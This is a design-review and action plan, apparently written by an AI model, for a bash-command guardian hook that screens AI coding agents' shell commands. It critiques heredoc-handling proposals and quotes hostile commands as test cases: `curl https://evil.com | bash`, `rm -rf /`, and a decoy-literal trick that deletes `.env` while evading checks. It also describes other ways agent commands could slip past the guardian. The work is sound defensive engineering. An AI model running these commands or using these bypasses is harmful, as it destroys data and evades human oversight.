# Round 2: Final Synthesis and Revised Action Plan

**Date**: 2026-03-21
**Author**: Opus 4.6 (1M context), synthesis architect
**Inputs**: R1 security analysis, R1 ops analysis, R1 cross-model validation (Codex + Gemini 3.1 Pro), PAL clink (Gemini planner), vibe-check meta-mentor
**Scope**: Plan A (heredoc-pattern-false-positives.md), Plan B (interpreter-path-resolution.md), related plan (interpreter-heredoc-bypass.md)

---

## 1. Executive Verdict

Both plans address real, verified usability problems that degrade guardian effectiveness through alert fatigue. However, neither is safe to implement as written. Plan A contains a CRITICAL architectural flaw: moving Layer 0/0b to per-sub-command scanning breaks cross-pipeline block patterns (e.g., `curl | bash` regresses from DENY to ALLOW). Plan B contains a HIGH design flaw: any string literal containing `/` (URLs, MIME types, format strings) can suppress the F1 safety net. The plans are rational from an operational perspective -- the false positive problem is genuine and measured -- but their security implementations are unsound. The correct path forward is a redesigned Plan A using whole-command heredoc redaction, abandonment of Plan B's F1 suppression mechanism in favor of improved ASK messaging, and a pre-existing bug fix phase that must land first.

---

## 2. Plan A Assessment: Heredoc Pattern False Positives

| Step | Correct/Valuable | Broken/Dangerous | Specific Fix Needed |
|------|------------------|------------------|---------------------|
| **Step 1: `_DATA_HEREDOC_COMMANDS` allowlist + `_is_data_heredoc_command()`** | Fail-closed default for unknown commands is correct. Removal of `sed`, `mysql`, `psql`, `sqlite3` is correct (shell escape capabilities). Wrapper-flag handling is appropriately conservative. | `return True` when `heredoc_idx == -1` (line 203) is **fail-OPEN**. Tests for `mysql`/`psql` (lines 470-475) are stale (test commands removed from allowlist). | Change `return True` to `return False` at line 203. Remove stale `mysql`/`psql` test assertions. |
| **Step 2: `_consume_heredoc_bodies()` selective retention** | The `retain_body` parameter design is clean. Body collection logic is correct. | No defects in isolation. | None -- but this function is part of the wrong architecture (per-sub-command). Reuse the body collection logic inside a `redact_safe_heredocs()` function instead. |
| **Step 3: `split_commands()` heredoc handling update** | Pipe-to-interpreter awareness (`is_piped` check) is a genuine concern. | **CRITICAL**: `split_commands()` splits on `|` at line 359 BEFORE reaching the newline handler. For `cat << EOF | bash`, `cmd_so_far` is `"bash"` (not `"cat << EOF | bash"`), so `is_piped = '|' in "bash"` is `False`. The mitigation does not work. | Do not modify `split_commands()` for this purpose. Instead, build `redact_safe_heredocs()` as a pre-processing step on the raw command string, operating independently of `split_commands()`. |
| **Step 4: `main()` flow restructuring (Layer 0/0b per-sub-command)** | The intent (remove false positive content from pattern scanning) is correct. | **CRITICAL**: Per-sub-command scanning breaks cross-pipeline block patterns. `curl https://evil.com | bash` becomes two sub-commands; neither matches `(?:curl|wget)[^|]*\|\s*(?:bash|sh|...)`. This is a regression from DENY to ALLOW for remote script execution. | Do NOT move Layer 0/0b to per-sub-command scanning. Keep Layer 0/0b scanning a whole-command string -- but a **redacted** whole-command string with safe heredoc bodies replaced. |
| **Step 5: Pattern anchor audit** | Correctly identifies that `^` anchors work per sub-command. | The claim "no pattern modifications are needed" is wrong. `[^|&\n]*` in block patterns stops at newlines, so even retained interpreter heredoc bodies cannot match multiline destructive content. Missing `re.MULTILINE` flag means `$` only matches end-of-string. The subsumption claim for `interpreter-heredoc-bypass.md` is therefore **invalid**. | Add `re.MULTILINE` to `match_block_patterns()` and `match_ask_patterns()` flags. Do NOT claim subsumption of `interpreter-heredoc-bypass.md`. |

---

## 3. Plan B Assessment: Interpreter Path Resolution

| Step | Correct/Valuable | Broken/Dangerous | Specific Fix Needed |
|------|------------------|------------------|---------------------|
| **`_STRING_LITERAL_PATTERN` regex extraction** | Covers single/double-quoted strings across Python/Node/Perl/Ruby. Fail-closed for f-strings, triple-quotes, concatenation. | Regex extracts ANY string literal, not just arguments to destructive API calls. Strings like `"https://example.com/api"` and `"application/json"` satisfy the path heuristic (contains `/`). This is broader than the "decoy literal" concern -- ordinary code routinely contains such strings. | Do not use generic string literal extraction to suppress F1. |
| **F1 suppression logic (`if interpreter_paths:`)** | Only activates when F1 would already fire (existing verdicts untouched). Extracted paths go through full validation pipeline. | **HIGH**: Suppresses F1 when ANY path is extracted, regardless of whether that path is the actual target of the destructive API. Attack: `python3 -c "safe='./temp/ok.txt'; os.remove(chr(46)+'env')"` extracts `./temp/ok.txt`, suppresses F1, actual target `.env` is invisible. Even without malice, incidental literals routinely suppress F1. | Do NOT suppress F1 based on extracted literals. F1 must remain unconditionally fail-closed for interpreter commands with unresolvable targets. |
| **`glob.glob()` expansion** | Handles glob patterns in interpreter code (common in cleanup scripts). | Unbounded filesystem probing on attacker-influenced input. `'/*/*/*/*/*/*/*/*/*'` causes DoS. Timing differences reveal filesystem structure (oracle). | If glob expansion is ever implemented, restrict to project directory, limit glob depth, add timeout. But this is moot since the F1 suppression approach is abandoned. |
| **Phase 2 AST extraction** | `ast.parse()` for Python is sound and handles all string constructs. | Even with AST, cannot prove source-to-sink binding (which literal is the argument to `os.remove()`?). Gemini correctly notes building AST parsers for every interpreter is untenable. | If ever pursued, narrow to Python-only, use AST to prove source-to-sink binding for `os.remove(literal)` pattern specifically. Do NOT suppress F1 -- only enrich the ASK message. |
| **Security analysis (lines 237-244)** | Correctly identifies threat model (AI agents, not malicious humans). Layer 0 still blocks single-line interpreter deletions. | The claim "F1 cannot be suppressed without valid paths" is incorrect -- the decoy literal attack demonstrates otherwise. The claim "ALL extracted paths" are validated is true but irrelevant when the malicious target is never extracted. | Rewrite security analysis to acknowledge the decoy literal weakness as a design flaw, not a mitigated risk. |

---

## 4. Optimal Path Forward

### Guiding Principles

1. **Fix bugs before adding features.** Pre-existing bugs in `re.MULTILINE` and delimiter parsing affect the correctness of any heredoc-related change.
2. **Preserve the whole-command scan.** Layer 0/0b must continue scanning a single string that preserves all pipeline operators.
3. **Redact, don't restructure.** Produce a "heredoc-redacted" version of the raw command for Layer 0/0b. This is simpler, lower-risk, and preserves the existing `main()` flow.
4. **F1 is sacred.** The fail-closed safety net must not be weakened. Improve the message, not the verdict.
5. **The write-to-file case needs special handling.** `cat << 'EOF' > script.sh` followed by `bash script.sh` is the most dangerous edge case and is not solved by any current plan.

### Implementation Phases

#### Phase 0: Pre-existing Bug Fixes (NO DEPENDENCIES, do first)

**0a. Add `re.MULTILINE` to block/ask pattern flags**

File: `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/_guardian_utils.py`
Location: line 872 (`match_block_patterns`) and the equivalent line in `match_ask_patterns`

Change:
```python
match = safe_regex_search(pattern, command, re.IGNORECASE | re.DOTALL)
```
To:
```python
match = safe_regex_search(pattern, command, re.IGNORECASE | re.DOTALL | re.MULTILINE)
```

Rationale: Without `re.MULTILINE`, `$` in patterns like `rm\s+-[rRf]+\s+/(?:\s*$|\*)` only matches end-of-string, not end-of-line. This is a pre-existing bug that affects detection of destructive commands in multiline inputs, including retained interpreter heredoc bodies.

Tests: Verify existing block pattern tests still pass. Add test for multiline command where destructive pattern appears mid-string.

**0b. Fix `_parse_heredoc_delimiter()` for backslash-escaped and ANSI-C quoted delimiters**

File: `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/bash_guardian.py`
Location: lines 443-473

Add handling for:
- Backslash-escaped bare words: `\EOF` -> delimiter is `EOF` (strip backslashes)
- ANSI-C quoting: `$'EOF'` -> delimiter is `EOF` (strip `$` prefix, then strip quotes)
- Locale translation: `$"EOF"` -> delimiter is `EOF` (strip `$` prefix, then strip quotes)

Current bare-word branch (line 468-473) stores `\EOF` as the literal delimiter, causing `_consume_heredoc_bodies()` to never find the terminator and consume all remaining input as heredoc body. With `cat << \EOF`, this silently discards subsequent dangerous commands.

Tests: Add tests for `cat << \EOF`, `cat << $'EOF'`, `cat << $"EOF"`.

**0c. Fix `_is_data_heredoc_command()` fail-open default (from Plan A)**

Even though Plan A's architecture is rejected, the `_is_data_heredoc_command()` function itself is valuable and will be reused. Fix the fail-open default:

```python
if heredoc_idx == -1:
    return False  # No heredoc found, fail-closed (not a data command)
```

#### Phase 1: Heredoc Body Redaction (depends on Phase 0)

**1a. Create `redact_safe_heredocs(command: str) -> str`**

File: `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/bash_guardian.py`

This function:
1. Walks the raw command string character-by-character (reusing `split_commands()` parsing logic but NOT calling `split_commands()`)
2. Identifies `<<` operators and their delimiters
3. Classifies the heredoc's consumer command using `_is_data_heredoc_command()`
4. For data heredocs: replaces the body lines (between delimiter line and terminator line) with empty string, preserving the delimiter lines and all surrounding operators
5. For interpreter/unknown heredocs: leaves the body intact
6. Returns the modified raw string

Key design decisions:
- **Write-to-file detection**: If the command before `<<` contains output redirection (`>` or `>>`), classify as UNSAFE (retain body) regardless of the base command. This catches `cat << 'EOF' > script.sh` where the body is written to an executable file.
- **Pipeline detection**: If the heredoc appears in a pipeline (any `|` between the `<<` and the end of the pipeline segment), classify as UNSAFE. This catches `cat << EOF | bash`.
- **Fail-closed**: If parsing fails at any point, return the original unmodified command.
- **No separate parser**: Reuses the same character-by-character walking logic as `split_commands()`, avoiding parsing differentials.

**1b. Integrate into `main()`**

File: `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/bash_guardian.py`
Location: lines 1422-1430

Change Layer 0 to scan the redacted string:
```python
# ========== Layer 0: Block Patterns ==========
redacted_command = redact_safe_heredocs(command)
blocked, reason = match_block_patterns(redacted_command)
```

Change Layer 0b similarly:
```python
# Layer 0b: Ask patterns
needs_ask, ask_reason = match_ask_patterns(redacted_command)
```

Everything else (`split_commands(command)`, Layer 1, Layers 3/4) continues to use the original `command` string unchanged. This is the minimal change principle: only Layer 0/0b get the redacted view.

**1c. Define the heredoc command classifier**

Use a **hybrid model**: small allowlist of proven passive data sinks (the "safe to redact" list) combined with special-case detection for dangerous patterns.

```python
_PASSIVE_DATA_SINKS = frozenset({
    'cat', 'tee',
    'grep', 'egrep', 'fgrep', 'head', 'tail', 'wc', 'sort', 'uniq',
    'cut', 'tr', 'fold', 'fmt', 'column', 'paste', 'join', 'comm',
    'echo', 'printf',
    'jq', 'yq',
})

# Commands that are NEVER safe to redact, regardless of other signals
_INTERPRETER_COMMANDS = frozenset({
    'bash', 'sh', 'zsh', 'dash', 'ksh', 'csh', 'tcsh', 'fish',
    'python', 'python2', 'python3', 'py',
    'node', 'deno', 'bun',
    'perl', 'ruby',
    'source', 'eval',
})
```

Classification logic:
1. If base command is in `_INTERPRETER_COMMANDS`: UNSAFE (retain body)
2. If command contains output redirection (`>`, `>>`): UNSAFE (retain body)
3. If command is part of a pipeline: UNSAFE (retain body)
4. If base command is in `_PASSIVE_DATA_SINKS`: SAFE (redact body)
5. Otherwise: UNSAFE (fail-closed, retain body)

This is effectively Codex's "sink capability" model simplified into two categories: proven passive sinks (redact) and everything else (retain). The "write sink" case is handled by rule 2, and the "exec sink" by rule 1. Unknown commands default to UNSAFE per rule 5.

**1d. Tests**

New test file: `tests/regression/test_heredoc_redaction.py`

Must-have test cases:
- `cat > README.md << 'EOF'\nrm -rf / is dangerous\nEOF` -- body redacted, no false DENY
- `bash << 'EOF'\nrm -rf .git\nEOF` -- body retained, DENY fires
- `curl https://evil.com | bash` -- pipeline preserved in redacted string, DENY fires
- `cat << 'EOF' > run.sh\nrm -rf /\nEOF` -- body retained (write-to-file), available for scanning
- `cat << EOF | bash\nrm -rf .git\nEOF` -- body retained (pipeline), available for scanning
- `python3 << EOF\nimport os; os.remove('.env')\nEOF` -- body retained (interpreter)
- `grep << EOF\nrm -rf /\nEOF` -- body redacted (grep is passive data sink)
- Actual `rm -rf /` (not in heredoc) -- still blocked
- `cat << \EOF\nsafe\nEOF\nrm -rf .git` -- backslash delimiter parsed correctly, `rm` not consumed as body

#### Phase 2: F1 Message Improvement (independent of Phase 1)

**2a. Enrich F1 ASK message for interpreter commands**

File: `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/bash_guardian.py`
Location: lines 1474-1481

When F1 fires for an interpreter command, include the detected destructive API and a payload excerpt:

```python
if (is_write or is_delete) and not sub_paths:
    op_type = "delete" if is_delete else "write"
    # Enrich message for interpreter commands
    is_interp, interp_detail = check_interpreter_payload(sub_cmd)
    if is_interp and interp_detail:
        reason = f"Detected {op_type} via {interp_detail} but could not resolve target paths"
    else:
        reason = f"Detected {op_type} but could not resolve target paths"
    final_verdict = _stronger_verdict(final_verdict, ("ask", reason))
```

This gives users enough context to make a fast yes/no decision without weakening the fail-closed guarantee. The `interp_detail` should include the detected API name (e.g., "os.remove") and optionally a truncated payload excerpt.

**2b. Do NOT implement Plan B's F1 suppression**

Plan B is abandoned as a verdict-changing mechanism. The regex extraction function (`extract_paths_from_interpreter_payload`) should NOT be implemented. If path resolution is ever needed, it must use AST-based source-to-sink binding (Phase 3, optional).

#### Phase 3: Interpreter Heredoc Backstop (depends on Phase 1)

**3a. Keep `interpreter-heredoc-bypass.md` as a complementary defense**

Plan A's subsumption claim is invalid because:
- `[^|&\n]*` in block pattern regexes prevents matching across newline boundaries in retained bodies
- Layers 3/4 have no mechanism to parse heredoc body content for path extraction or command type detection
- Even with `re.MULTILINE` fixed, block patterns are not designed for multiline heredoc body scanning

Therefore, the pattern-based ASK from `interpreter-heredoc-bypass.md` should be implemented as a defense-in-depth measure. When a sub-command starts with an interpreter and contains `<<`, issue an `ask` verdict.

**3b. Implementation**

Add to the per-sub-command loop in `main()` (around line 1461):

```python
for sub_cmd in sub_commands:
    # Interpreter+heredoc backstop
    if _is_interpreter_heredoc(sub_cmd):
        final_verdict = _stronger_verdict(
            final_verdict,
            ("ask", f"Interpreter command with heredoc: {truncate_command(sub_cmd)}")
        )
```

This is lightweight (~20 LOC for the detection function + integration), provides defense-in-depth for the case where heredoc body content evades block patterns, and correctly uses `ask` (not `deny`) since legitimate uses of `bash << EOF` exist.

#### Phase 4: Optional Future Work (NOT part of this plan)

- **Python AST recognizer for F1 enrichment**: Only if Phase 2 proves insufficient for reducing alert fatigue. Must NOT change F1 verdict -- only enrich ASK message with resolved paths.
- **System prompt guidance**: Instruct AI agents to use CLI tools rather than interpreter one-liners for filesystem operations. Zero-code, zero-risk.
- **Unterminated heredoc detection**: When `_consume_heredoc_bodies()` exhausts input without finding delimiter, flag as `ask`. Low priority but good hardening.

---

## 5. Paradigm Recommendation: The Hybrid Model

The allowlist vs. blocklist debate is settled as follows:

**Use an allowlist of proven passive data sinks for heredoc body REDACTION, combined with special-case RETENTION rules for dangerous patterns. Unknown commands default to RETENTION (fail-closed).**

Concretely:

| Category | Commands | Heredoc Body | Rationale |
|----------|----------|-------------|-----------|
| **Passive data sink** (allowlist) | `cat`, `tee`, `grep`, `head`, `tail`, `sort`, `wc`, `cut`, `tr`, `jq`, `yq`, etc. | REDACTED | Proven no-exec capability. Body is data, not code. |
| **Interpreter** (blocklist) | `bash`, `sh`, `python*`, `node`, `perl`, `ruby`, `source`, `eval` | RETAINED | Body is executable code. Must be scanned. |
| **Write sink** (pattern detection) | Any command with `>` or `>>` redirection | RETAINED | Body may be written to an executable file (`cat > script.sh`). |
| **Pipeline member** (pattern detection) | Any heredoc command in a pipeline | RETAINED | Body may pipe to an interpreter (`cat << EOF | bash`). |
| **Unknown** (default) | Everything else | RETAINED | Fail-closed. Unknown commands are treated as potential interpreters. |

This is Codex's "sink capability taxonomy" simplified into actionable rules. Gemini's "blocklist of interpreters" concern is addressed by rule 5: unknown commands are not silently allowed. The key insight from both models is that the **write sink** category requires special handling regardless of paradigm, and this model explicitly includes it.

**Why not pure blocklist (Gemini's preference)?** A pure interpreter blocklist would redact bodies for ALL non-interpreter commands, including `aws`, `kubectl`, custom scripts. While the AI threat model makes this relatively safe, it fails-open for any new interpreter not in the blocklist. The allowlist-with-fail-closed-default is more conservative and matches the guardian's stated security invariant.

**Why not pure sink capability (Codex's preference)?** The full four-category taxonomy adds implementation complexity without proportional security benefit. The simplified two-category model (redact vs. retain) achieves the same outcome with less code.

---

## 6. Risk Matrix

| Scenario | Security Outcome | Usability Outcome | Alert Fatigue |
|----------|-----------------|-------------------|---------------|
| **Plans implemented as-is** | CRITICAL regression: `curl|bash` bypasses DENY. F1 safety net weakened by decoy literals. | Good: heredoc false positives eliminated. | Reduced (but at cost of security) |
| **Plans implemented with R1 fixes** | Good: pipeline patterns preserved, F1 intact. | Good: heredoc false positives eliminated. F1 message improved. | Significantly reduced |
| **This revised plan (Phases 0-3)** | Best: all pre-existing bugs fixed, pipeline patterns preserved, F1 unconditionally fail-closed, interpreter heredoc backstop added, write-to-file case handled. | Good: same false positive reduction as Plan A for data heredocs. F1 still fires for interpreter commands but with better messages. | Significantly reduced for data heredocs. Interpreter commands still trigger ASK (acceptable -- these warrant human review). |

**Quantified impact estimate:**
- Scenarios A-F from Plan A (documentation heredocs triggering DENY) are fully resolved by Phase 1.
- Scenario I (SQL in data heredocs) is resolved when target command is `cat`/`tee`.
- The motivating case for Plan B (`python3 -c "glob.glob(...) os.remove(...)"`) still triggers F1 ASK, but with an improved message showing `os.remove` was detected. This is the correct outcome -- interpreter delete commands should require confirmation.

---

## 7. Open Questions

1. **`_consume_heredoc_bodies()` in `redact_safe_heredocs()`**: Should this function walk the command independently or reuse `split_commands()` internal state? Independent walking is safer (no coupling) but duplicates ~40 lines of parsing logic. Recommendation: independent walking with shared helper functions for delimiter parsing.

2. **Here-string (`<<<`) false positives**: `grep <<< "rm -rf /"` puts `rm -rf /` in the raw command string. `split_commands()` handles `<<<` correctly, but Layer 0/0b scan the raw string before `split_commands()`. Should `redact_safe_heredocs()` also handle here-strings? Recommendation: yes, but as a Phase 1 stretch goal.

3. **Process substitution with heredoc**: `bash <(cat << EOF\nrm -rf .git\nEOF)` -- the `cat` heredoc body is redacted, but `bash` executes the output. This is similar to the write-to-file case. Recommendation: document as known limitation; process substitution parsing is out of scope for the current `split_commands()` architecture.

4. **Performance impact of double-parsing**: `redact_safe_heredocs()` walks the command string once, then `split_commands()` walks it again. For typical commands (<1KB), this is negligible. For commands near `MAX_COMMAND_LENGTH` (64KB), measure actual impact. Recommendation: acceptable overhead for security correctness.

5. **`base64`, `sha256sum`, `xxd`, `gzip` in allowlist**: These commands process encoded data whose heredoc bodies could coincidentally match block patterns. None have shell escape capabilities. Should they be added to `_PASSIVE_DATA_SINKS`? Recommendation: add in a follow-up after the core implementation ships, with explicit tests.

6. **Interaction between `re.MULTILINE` and existing patterns**: Adding `re.MULTILINE` changes `$` semantics for ALL block/ask patterns. Audit all patterns in `guardian.default.json` and `guardian.recommended.json` to verify no pattern relies on `$` meaning end-of-string. Recommendation: must be done as part of Phase 0a.

---

## Summary: What to Keep, What to Discard, What to Change

| From Plan A | Verdict |
|------------|---------|
| `_DATA_HEREDOC_COMMANDS` allowlist concept | **KEEP** (rename to `_PASSIVE_DATA_SINKS`) |
| `_is_data_heredoc_command()` function | **KEEP** (fix fail-open default) |
| `_consume_heredoc_bodies()` selective retention | **CHANGE**: reuse body collection logic inside `redact_safe_heredocs()`, not inside `split_commands()` |
| Per-sub-command Layer 0/0b scanning | **DISCARD** (breaks pipeline patterns) |
| Pipe-to-interpreter mitigation in `split_commands()` | **DISCARD** (structurally broken due to split-on-pipe ordering) |
| Subsumption of `interpreter-heredoc-bypass.md` | **DISCARD** (invalid claim) |
| Backslash delimiter fix | **KEEP** (genuine bug) |
| Test structure | **KEEP** (adapt to new architecture) |

| From Plan B | Verdict |
|------------|---------|
| `extract_paths_from_interpreter_payload()` | **DISCARD** (decoy literal attack, generic literal harvesting) |
| F1 suppression logic | **DISCARD** (violates fail-closed invariant) |
| `glob.glob()` expansion | **DISCARD** (DoS vector, moot without F1 suppression) |
| Phase 2 AST extraction | **DEFER** (optional future enrichment, never for verdict change) |
| Improved F1 message | **KEEP** (the only safe improvement from Plan B) |

| From interpreter-heredoc-bypass.md | Verdict |
|-----------------------------------|---------|
| Pattern-based ASK for interpreter+heredoc | **KEEP** (implement as Phase 3 defense-in-depth) |
| `INTERPRETER_HEREDOC_PATTERNS` regex list | **KEEP** (complementary to heredoc redaction) |

---

## Files to Modify (Implementation Map)

| Phase | File | Change | Est. LOC |
|-------|------|--------|----------|
| 0a | `hooks/scripts/_guardian_utils.py` | Add `re.MULTILINE` to `match_block_patterns` and `match_ask_patterns` flags | 2 |
| 0b | `hooks/scripts/bash_guardian.py` | Fix `_parse_heredoc_delimiter()` for backslash, `$'...'`, `$"..."` | 15 |
| 0c | `hooks/scripts/bash_guardian.py` | Fix `_is_data_heredoc_command()` fail-open default | 1 |
| 1a | `hooks/scripts/bash_guardian.py` | New `redact_safe_heredocs()` function | ~80 |
| 1b | `hooks/scripts/bash_guardian.py` | Integrate redaction into `main()` (2 lines changed) | 4 |
| 1c | `hooks/scripts/bash_guardian.py` | `_PASSIVE_DATA_SINKS`, `_INTERPRETER_COMMANDS`, classification logic | ~30 |
| 1d | `tests/regression/test_heredoc_redaction.py` | New test file | ~200 |
| 2a | `hooks/scripts/bash_guardian.py` | Enrich F1 ASK message | ~10 |
| 3a | `hooks/scripts/bash_guardian.py` | `_is_interpreter_heredoc()` + integration in per-sub-command loop | ~25 |
| 3b | `tests/security/test_interpreter_heredoc.py` | Tests for interpreter+heredoc backstop | ~80 |
| -- | `action-plans/heredoc-pattern-false-positives.md` | Update frontmatter: status -> active, note architectural redesign | -- |
| -- | `action-plans/interpreter-path-resolution.md` | Update frontmatter: status -> blocked, note F1 suppression abandoned | -- |
| -- | `action-plans/interpreter-heredoc-bypass.md` | Update frontmatter: status -> active, note implementation as Phase 3 | -- |

**Total estimated LOC**: ~447 (including ~280 lines of tests)
**Estimated effort**: 2-3 focused implementation sessions
